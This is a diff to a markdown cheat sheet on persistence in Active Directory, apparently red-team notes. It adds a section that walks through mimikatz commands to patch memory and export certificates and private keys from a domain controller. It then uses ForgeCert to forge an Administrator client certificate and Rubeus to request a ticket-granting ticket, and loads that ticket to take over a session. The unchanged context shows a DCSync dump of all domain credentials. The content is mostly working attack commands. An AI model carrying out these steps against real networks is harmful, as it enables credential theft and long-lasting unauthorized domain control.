@@ -1,5 +1,5 @@
 
-# #Persist with Credentials:
+# #Persistence with Credentials:
 ### The goal then is to persist with near-privileged credentials.
   - **Credentials that have local administrator rights on several machines**
   - **Service accounts that have delegation permissions**
@@ -13,7 +13,7 @@ for example:
   - mimikatz # lsadump::dcsync /domain:<Domain-name> /all
 ```
 
-# #Persist with Tickets:
+# #Persistence with Tickets:
   - **Golden Tickets**
   - **Silver Tickets**
 
@@ -46,4 +46,33 @@ for example:
 - after executing this, the ticket is loaded into memory and we can access a specific privileged resources in the domain
 
 
-# #Persist with Certificates:
+# #Persistence with Certificates:
+  - **view the Stored certificates on the DC**
+  ```
+  mimikatz # crypto::certificates /systemstore:local_machine
+  ```
+  - **patch memory to make private keys exportable**
+  ```
+  mimikatz # crypto::capi
+  mimikatz # crypto::cng
+  ```
+  - **Use mimikatz to Export the certificates:**
+  ```
+  mimikatz # crypto::certificates /systemstore:local_machine /export
+  # now we have PFX or DER file
+  ```
+  - **if we have the private key and root CA certificate, we can forge a Client Authenticate certificate for any user we want.**
+  ```
+  ForgeCert.exe --CaCertPath Filename.pfx --CaCertPassword <filepassword> --Subject CN=User --SubjectAltName Administrator@<FQDN> --NewCertPath fullAdmin.pfx --NewCertPassword Password123
+  ```
+  - **We can use Rubeus to request a TGT using the certificate**
+  ```
+    Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<certFile> /password:<certFile-password> /outfile: /domain:<DomainName> /dc:<DC-IP>
+  ```
+  - **Use mimikatz to use TGT to Authenticate to LogonServer**
+  ```
+  mimikatz # kerberos::ptt administrator.kirbi
+  mimikatz # exit
+  # Done! we have the session.
+  ```
+  
